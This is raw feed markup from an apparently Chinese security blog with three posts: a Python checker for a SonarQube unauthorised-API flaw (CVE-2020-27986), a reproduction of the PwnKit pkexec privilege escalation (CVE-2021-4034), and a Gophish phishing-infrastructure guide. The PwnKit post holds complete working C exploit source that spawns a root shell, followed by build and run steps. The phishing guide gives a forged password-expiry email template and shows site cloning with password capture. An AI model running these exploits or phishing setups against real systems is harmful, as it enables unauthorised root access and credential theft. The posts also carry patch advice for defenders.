class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># author: Zeo</span><br><span class="line"># python: 3.7 </span><br><span class="line"># datetime:2021&#x2F;11&#x2F;25 3:40 下午</span><br><span class="line"># software: PyCharm</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">文件说明：</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">class EXP():</span><br><span class="line">    def __init__(self, args):</span><br><span class="line">        self.name &#x3D; &#39;&#39;&#39;CVE-2020-27986 SonarQube api 未授权访问&#39;&#39;&#39;</span><br><span class="line">        self.url &#x3D; args.url</span><br><span class="line">        self.res &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        path &#x3D; &#39;&#x2F;api&#x2F;settings&#x2F;values&#39;</span><br><span class="line">        try:</span><br><span class="line">            resp &#x3D; requests.get(self.url+path, timeout&#x3D;10, verify&#x3D;False)</span><br><span class="line">            if resp.status_code &#x3D;&#x3D; 200  and &#39;application&#x2F;json&#39; in resp.headers[&#39;Content-Type&#39;] and &#39;sonaranalyzer-cs.nuget.packageVersion&#39; in resp.text and &#39;sonar.core.id&#39; in resp.text:</span><br><span class="line">                self.res &#x3D; &quot;存在漏洞!&quot;</span><br><span class="line">            else:</span><br><span class="line">                self.res &#x3D; &quot;不存在漏洞!&quot;</span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(&quot;目标连接错误....&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parseArgs():</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&quot;[Exp]!&quot;,formatter_class&#x3D;argparse.RawDescriptionHelpFormatter)</span><br><span class="line">    group &#x3D; parser.add_mutually_exclusive_group()</span><br><span class="line">    group.add_argument(&quot;-u&quot;, &#39;--url&#39;, help&#x3D;&quot;URL to scan; -u http:&#x2F;&#x2F;example.com&quot;)</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">    return args</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def output(exp):</span><br><span class="line">    </span><br><span class="line">    # print(f&quot;Name &#123;exp.name&#125;&quot;)</span><br><span class="line">    print(f&quot;URL &#123;exp.url&#125;&quot;)</span><br><span class="line">    print(f&quot;RES &#123;exp.res&#125;&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    args &#x3D; parseArgs()</span><br><span class="line">    z</span><br><span class="line">    exp &#x3D; EXP(args)</span><br><span class="line">    try:</span><br><span class="line">        exp._attack()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        exp.res &#x3D; &quot;Error&quot;</span><br><span class="line"></span><br><span class="line">    output(exp)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-4034 Linux Polkit pkexec权限提升漏洞</title>
      <link href="/2022/01/26/CVE-2021-4034%20Linux%20Polkit%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/01/26/CVE-2021-4034%20Linux%20Polkit%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-CVE-2021-4034-漏洞详情"><a href="#0x01-CVE-2021-4034-漏洞详情" class="headerlink" title="0x01 CVE-2021-4034 漏洞详情"></a><strong>0x01 CVE-2021-4034 漏洞详情</strong></h1><p>Polkit（PolicyKit）是一个用于控制类Unix系统中系统范围权限的组件，它为非特权进程与特权进程的通信提供了一种有组织的方式。pkexec是Polkit开源应用框架的一部分，它负责协商特权进程和非特权进程之间的互动，允许授权用户以另一个用户的身份执行命令，是sudo的替代方案。</p><p>1月25日，研究人员公开披露了在 polkit 的 pkexec 中发现的一个权限提升漏洞（CVE-2021-4034 ，也称PwnKit)，它存在于所有主流的 Linux 发行版的默认配置中。受影响版本的 pkexec 无法正确处理调用参数计数，最终尝试将环境变量作为命令执行，攻击者可以通过修改环境变量来利用此漏洞，诱使 pkexec 执行任意代码，从而导致将本地权限提升为root。</p><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a><strong>0x02 影响范围</strong></h1><p>自2009年以来的所有 Polkit 版本（存在于所有主流的 Linux 发行版中）</p><p>CentOS系列：</p><p>CentOS 6：polkit-0.96-11.el6_10.2</p><p>CentOS 7：polkit-0.112-26.el7_9.1</p><p>CentOS 8.0：polkit-0.115-13.el8_5.1</p><p>CentOS 8.2：polkit-0.115-11.el8_2.2</p><p>CentOS 8.4：polkit-0.115-11.el8_4.2</p><p>Ubuntu系列：</p><p>Ubuntu 20.04 LTS：policykit-1 - 0.105-26ubuntu1.2</p><p>Ubuntu 18.04 LTS：policykit-1 - 0.105-20ubuntu0.18.04.6</p><p>Ubuntu 16.04 ESM：policykit-1 - 0.105-14.1ubuntu0.5+esm1</p><p>Ubuntu 14.04 ESM：policykit-1 - 0.105-4ubuntu3.14.04.6+esm1</p><h1 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h1><p>利用十分简单</p><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><p><a href="https://github.com/arthepsy/CVE-2021-4034" target="_blank" rel="noopener">https://github.com/arthepsy/CVE-2021-4034</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;arthepsy&#x2F;CVE-2021-4034</span><br></pre></td></tr></table></figure><p>由于代码简单，也可以直接写到文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *shell = </span><br><span class="line"><span class="string">"#include &lt;stdio.h&gt;\n"</span></span><br><span class="line"><span class="string">"#include &lt;stdlib.h&gt;\n"</span></span><br><span class="line"><span class="string">"#include &lt;unistd.h&gt;\n\n"</span></span><br><span class="line"><span class="string">"void gconv() &#123;&#125;\n"</span></span><br><span class="line"><span class="string">"void gconv_init() &#123;\n"</span></span><br><span class="line"><span class="string">"setuid(0); setgid(0);\n"</span></span><br><span class="line"><span class="string">"seteuid(0); setegid(0);\n"</span></span><br><span class="line"><span class="string">"system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"</span></span><br><span class="line"><span class="string">"exit(0);\n"</span></span><br><span class="line"><span class="string">"&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line">system(<span class="string">"mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"</span>);</span><br><span class="line">system(<span class="string">"mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules"</span>);</span><br><span class="line">fp = fopen(<span class="string">"pwnkit/pwnkit.c"</span>, <span class="string">"w"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"%s"</span>, shell);</span><br><span class="line">fclose(fp);</span><br><span class="line">system(<span class="string">"gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"</span>);</span><br><span class="line"><span class="keyword">char</span> *env[] = &#123; <span class="string">"pwnkit"</span>, <span class="string">"PATH=GCONV_PATH=."</span>, <span class="string">"CHARSET=PWNKIT"</span>, <span class="string">"SHELL=pwnkit"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">execve(<span class="string">"/usr/bin/pkexec"</span>, (<span class="keyword">char</span>*[])&#123;<span class="literal">NULL</span>&#125;, env);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc cve-2021-4034-poc.c -o cve-2021-4034-poc</span><br></pre></td></tr></table></figure><h2 id="3、运行"><a href="#3、运行" class="headerlink" title="3、运行"></a>3、运行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cve-2021-4034-poc</span><br></pre></td></tr></table></figure><h2 id="4、成功"><a href="#4、成功" class="headerlink" title="4、成功"></a>4、成功</h2><p>Centos7</p><p><img src="https://img-blog.csdnimg.cn/img_convert/67573a977096f3fb48bf55828197f3e7.png" alt="image-20220126155148796"></p><p>Ubuntu18</p><p><img src="https://img-blog.csdnimg.cn/img_convert/119d7639b9471554791588fe048d56d2.png" alt="image-20220126155212034"></p><h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h1><h3 id="通用修补建议"><a href="#通用修补建议" class="headerlink" title="通用修补建议"></a>通用修补建议</h3><p>根据<code>影响版本</code>中的信息，排查并升级到<code>安全版本</code></p><h3 id="临时修补建议"><a href="#临时修补建议" class="headerlink" title="临时修补建议"></a>临时修补建议</h3><p>目前此漏洞已经修复，建议受影响用户及时升级更新。</p><p>补丁下载链接：</p><p><a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683" target="_blank" rel="noopener">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683</a></p><p>注：</p><p>1.Ubuntu已经为PolicyKit推送了更新，以解决14.04和16.04 ESM版本以及最近的18.04、20.04和21.04版本中的漏洞。</p><p>下载链接：</p><p><a href="https://ubuntu.com/security/notices/USN-5252-2" target="_blank" rel="noopener">https://ubuntu.com/security/notices/USN-5252-2</a></p><p>2.Red Hat已经为 Workstation 和 Enterprise 产品上的polkit提供了安全更新。</p><p>下载链接：</p><p><a href="https://access.redhat.com/security/security-updates/#/security-advisories" target="_blank" rel="noopener">https://access.redhat.com/security/security-updates/#/security-advisories</a></p><p>3.如果系统没有可用的补丁，可以从 pkexec 中删除 SUID 位作为临时缓解措施，如：chmod 0755 /usr/bin/pkexec</p><p>参考链接：</p><p><a href="https://www.venustech.com.cn/new\_type/aqtg/20220126/23411.html" target="_blank" rel="noopener">https://www.venustech.com.cn/new\_type/aqtg/20220126/23411.html</a></p><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener">https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</a></p><p><a href="https://www.bleepingcomputer.com/news/security/linux-system-service-bug-gives-root-on-all-major-distros-exploit-released/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/linux-system-service-bug-gives-root-on-all-major-distros-exploit-released/</a></p><p><a href="https://access.redhat.com/security/cve/cve-2021-4034" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2021-4034</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全研究 linux 安全 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼指北 Gophish钓鱼平台和邮件服务器搭建</title>
      <link href="/2022/01/20/%E9%92%93%E9%B1%BC%E6%8C%87%E5%8C%97%20Gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E5%92%8C%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/01/20/%E9%92%93%E9%B1%BC%E6%8C%87%E5%8C%97%20Gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E5%92%8C%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-攻防演练钓鱼"><a href="#0x00-攻防演练钓鱼" class="headerlink" title="0x00 攻防演练钓鱼"></a>0x00 攻防演练钓鱼</h1><p>起因，在大型攻防演练中，传统的web层面Nday打点突破难点变大，于是越来越多的攻击队会加入钓鱼行动中，本文章就常规邮件的钓鱼进行介绍，后续还有IM这种也是很有效的方式。</p><h1 id="0x01-搭建Gophish钓鱼平台"><a href="#0x01-搭建Gophish钓鱼平台" class="headerlink" title="0x01 搭建Gophish钓鱼平台"></a>0x01 搭建Gophish钓鱼平台</h1><p>Gophish 是一个功能强大的开源网络钓框架，安装运行都非常简单。</p><p>Github 地址：<a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">https://github.com/gophish/gophish</a></p><h3 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h3><p><a href="https://github.com/gophish/gophish/releases" target="_blank" rel="noopener">https://github.com/gophish/gophish/releases</a></p><p>下载对应的版本</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8fab9b645d31a766e19380e93d7ba172.png" alt="image-20220117161349446"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;gophish&#x2F;gophish&#x2F;releases&#x2F;download&#x2F;v0.11.0&#x2F;gophish-v0.11.0-linux-64bit.zip</span><br><span class="line"></span><br><span class="line">unzip gophish-v0.11.0-linux-64bit.zip</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20220117161600.png" alt="image-20220117161600498"></p><h3 id="2、修改-config-json"><a href="#2、修改-config-json" class="headerlink" title="2、修改 config.json"></a>2、修改 config.json</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config.json</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d8e75edd90559295165af0b4dfb4f3e4.png" alt="image-20220117161759312"></p><ul><li><p>admin_server 把 127.0.0.1 改为 0.0.0.0,外网直接访问就要0.0.0.0</p></li><li><p>listen_url也要是0.0.0.0:81，我的80端口被占用了，所以改81</p></li></ul><h3 id="3、运行"><a href="#3、运行" class="headerlink" title="3、运行"></a>3、运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x gophish</span><br><span class="line">.&#x2F;gophish</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/5eb24b477ee941747fa0256ccbd2ed5c.png" alt="image-20220117162021496"></p><p>默认的admin密码再在最后，自己找一下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0588860699bb5996ae08cc57164d3e81.png" alt="image-20220117162112606"></p><h3 id="4、搭建完成"><a href="#4、搭建完成" class="headerlink" title="4、搭建完成"></a>4、搭建完成</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;VPS-IP:3333&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c135a40a5ee475350fa3b4888e18521d.png" alt="image-20220117162338519"></p><p>也可以直接使用公共邮箱，去开通一下就好了。但是发多了会被封的，所以我们还是自己搭。</p><h1 id="0x02-购买域名"><a href="#0x02-购买域名" class="headerlink" title="0x02 购买域名"></a>0x02 购买域名</h1><p>建议使用国外的域名和云vps</p><p>要自己去弄一个近似域名发件人去发一些钓鱼邮件，这个自己购买吧</p><p>在此近似域名的DNS管理页面增加两条记录:</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ff88892b0c54db5123ed2248a03b4084.png" alt="image-20220117160858770"></p><h1 id="0x03-邮件服务器的搭建"><a href="#0x03-邮件服务器的搭建" class="headerlink" title="0x03 邮件服务器的搭建"></a>0x03 邮件服务器的搭建</h1><ul><li>公共邮箱其实也是可以，但是发多了会被封的，所以我们还是自己搭。</li><li>由于我的VPS一直是Ubuntu，所以选择使用 Postfix+mailutils</li></ul><p>（如果是centos，有更好用的平台EwoMail搭建，参考官方文档进行一步步搭建<a href="http://doc.ewomail.com/docs/ewomail/install）" target="_blank" rel="noopener">http://doc.ewomail.com/docs/ewomail/install）</a></p><h3 id="1、安装Postfix"><a href="#1、安装Postfix" class="headerlink" title="1、安装Postfix"></a>1、安装Postfix</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install postfix</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0e43ca140c4dd16dbc0afe926cf3220d.png" alt="image-20220117160043668"></p><p>写入自己域名，不需要前缀</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bccd1da41b6ea5d6e7e61ed88a94b052.png" alt="image-20220117102647996"></p><h3 id="2、安装mailx软件包"><a href="#2、安装mailx软件包" class="headerlink" title="2、安装mailx软件包"></a>2、安装mailx软件包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install mailutils</span><br></pre></td></tr></table></figure><h3 id="3、增加测试用户"><a href="#3、增加测试用户" class="headerlink" title="3、增加测试用户"></a>3、增加测试用户</h3><p>这个用户就是将来收发邮件那个同名用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -s &#x2F;bin&#x2F;bash master</span><br><span class="line">passwd master</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6dd2e0eb30b519f97cb8c6c4db18c8b2.png" alt="image-20220117103020892"></p><h3 id="4、测试邮件发送"><a href="#4、测试邮件发送" class="headerlink" title="4、测试邮件发送"></a>4、测试邮件发送</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@10-7-21-215:~# telnet localhost 25</span><br><span class="line">Trying ::1...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line">220 10-7-21-215 ESMTP Postfix (Ubuntu)</span><br><span class="line">ehlo localhost</span><br><span class="line">250-10-7-21-215</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250-DSN</span><br><span class="line">250 SMTPUTF8</span><br><span class="line">mail from:master@icbxxxxices.ml</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">rcpt to:123456@qq.com</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">data</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">Subject:this is test qq mail</span><br><span class="line">qqqq</span><br><span class="line">ssss</span><br><span class="line">.</span><br><span class="line">250 2.0.0 Ok: queued as 09B30C444A</span><br><span class="line">quit</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ffe9acbfe78571c9eeefb478dea1da76.png" alt="image-20220117160745104"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4d7ac2ca45c6035ed86fe3130aaaa87e.png" alt="image-20220117160726281"></p><h3 id="5、收到测试邮件"><a href="#5、收到测试邮件" class="headerlink" title="5、收到测试邮件"></a>5、收到测试邮件</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/cc6e08529049274773e743edea110789.png" alt="image-20220117160654796"></p><h3 id="6、回复一下邮件，可以接受邮件"><a href="#6、回复一下邮件，可以接受邮件" class="headerlink" title="6、回复一下邮件，可以接受邮件"></a>6、回复一下邮件，可以接受邮件</h3><p>切换用户看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - master</span><br><span class="line">mail</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/aa038c1aec0ee43169a352b2758c8bc3.png" alt="image-20220117114317418"></p><h3 id="7、邮件服务器done"><a href="#7、邮件服务器done" class="headerlink" title="7、邮件服务器done"></a>7、邮件服务器done</h3><h1 id="0x04-实战钓鱼"><a href="#0x04-实战钓鱼" class="headerlink" title="0x04 实战钓鱼"></a>0x04 实战钓鱼</h1><p>环境搭建好了，那么下面就开始正式钓鱼了</p><h2 id="1、Sending-Profiles-邮箱配置"><a href="#1、Sending-Profiles-邮箱配置" class="headerlink" title="1、Sending Profiles-邮箱配置"></a>1、Sending Profiles-邮箱配置</h2><p>使用本机刚刚陪着好邮件服务器</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0f7054301f79298645f9659ef5fd7caf.png" alt="image-20220117172647005"></p><p><strong>此处需要注意的是Host处：</strong></p><ul><li>因为大部分的国内云厂商因为 监管要求，为防止邮件泛滥，都将25端口禁用了，因此可采用带有SSL的SMTP服务的端 口：465端口。</li><li>我能用是因为，我用的vps是国外的，大家自行更改。</li><li>因为我们的 Gophish 服务器跟邮件服务器搭在同一台 VPS 上面，所以在这里填写 127.0.0.1</li></ul><h3 id="发送测试一下"><a href="#发送测试一下" class="headerlink" title="发送测试一下"></a>发送测试一下</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9e2797d4939eaaf1b91cdfa2ff027048.png" alt="image-20220117172859038"></p><h3 id="收到邮件"><a href="#收到邮件" class="headerlink" title="收到邮件"></a>收到邮件</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/dbb44453910a330c0ad4e665253cd172.png" alt="image-20220117173154818"></p><h2 id="2、Email-Templates-钓鱼邮件模板"><a href="#2、Email-Templates-钓鱼邮件模板" class="headerlink" title="2、Email Templates-钓鱼邮件模板"></a>2、Email Templates-钓鱼邮件模板</h2><p>第一种自己写</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3a69bc02c591e26c1c0bb474449b0132.png" alt="image-20220117173838799"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;您好：&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;近期检测到您在学者网教学科研协作单位平台的密码已过期， 请点击&lt;a href&#x3D;&quot;&#123;&#123;.URL&#125;&#125;&quot;&gt;此链接&lt;&#x2F;a&gt;尽快修改密码，谢谢配合！&lt;&#x2F;p&gt;</span><br><span class="line">&#123;&#123;.Tracker&#125;&#125;&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;请不要直接回复本邮件。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;学信网&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>第二种可以导入现有的邮件</p><p>首先将原有的邮件导出为eml格式。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6e8b8c6af1a5626bf2a05c97b4c6f60c.png" alt="image-20220117174448234"></p><p>导入即可</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e735df23c718d41b25fe79163b43d2ec.png" alt="image-20220117174400492"></p><p>把超链接的部分，加上URL标签，最后设置钓鱼页面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/84ef1fb1a81f06626a878f41c0d7ad05.png" alt="image-20220117174749203"></p><h2 id="3、Landing-Pages-伪造钓鱼页面"><a href="#3、Landing-Pages-伪造钓鱼页面" class="headerlink" title="3、Landing Pages-伪造钓鱼页面"></a>3、Landing Pages-伪造钓鱼页面</h2><p>配置好钓鱼邮件后，就可以通过LandingPages模块来新建钓鱼网站页面。</p><p>1、此处支持手写 html文件</p><p>2、直接克隆网站</p><p>我使用第二种：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a50b70955b54cacf4a1794850d2688cf.png" alt="image-20220117175521760"></p><p>其中选项：</p><ul><li>CaptureSubmitted Data和CapturePasswords，记录受害者输入的账号和密码。</li><li>Redirect to填写该页面真实的地址，方便受害者点击完提交按钮后，自动跳转至真正的网站。</li></ul><h2 id="4、Users-amp-Groups-邮件用户和组"><a href="#4、Users-amp-Groups-邮件用户和组" class="headerlink" title="4、Users&amp; Groups-邮件用户和组"></a>4、Users&amp; Groups-邮件用户和组</h2><p>此时就可以进行下一步的配置，设置要进行钓鱼攻击的邮箱地址</p><p>使用模版批量导入，导入邮箱可以使用CSV进行批量添加</p><p>(格式可点击<code>Download CSV TEmplate</code>获取模板)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8a34e904738416ea8c290657818ad149.png" alt="image-20220117175956861"></p><h2 id="5、Campaigns-钓鱼测试"><a href="#5、Campaigns-钓鱼测试" class="headerlink" title="5、Campaigns-钓鱼测试"></a>5、Campaigns-钓鱼测试</h2><p>配置Campaigns，填写Name、选择钓鱼邮件模板、选择钓鱼网站模板、填写钓鱼网站 URL、填写发件邮箱、选择受害者邮件组。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/85df2c9dfdeee9b09d04b774e40ce3e4.png" alt="image-20220117180250617"></p><p>注意这个URL是VPS上gophish一开始配置的那个</p><p>就是 <a href="http://vps-ip:81" target="_blank" rel="noopener">http://vps-ip:81</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8040e0335371b0ce830434dcf05afbff.png" alt="image-20220117180454331"></p><h2 id="6、查看战果"><a href="#6、查看战果" class="headerlink" 